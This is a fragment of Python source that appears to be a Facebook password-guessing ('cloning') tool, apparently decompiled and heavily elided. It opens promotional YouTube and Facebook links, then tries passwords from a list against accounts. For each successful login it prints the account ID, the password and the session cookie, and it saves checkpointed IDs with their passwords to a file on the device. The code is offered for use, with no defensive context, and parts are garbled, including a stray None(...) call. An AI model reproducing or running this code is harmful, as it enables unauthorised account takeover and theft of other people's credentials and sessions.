...
def ud():
    ...
    if opt == '1':
        os.system('xdg-open https://youtube.com/@XhoterGaming?si=MSVsrybdFc93ffhI')
        FD()
        return None
...
def FD():
    ...
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100034501160287&mibextid=ZbWKwL')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[ARIYAN💚 -OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[ARIYAN❤️ -CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ARIYAN❤️ -CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[ARIYAN ] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
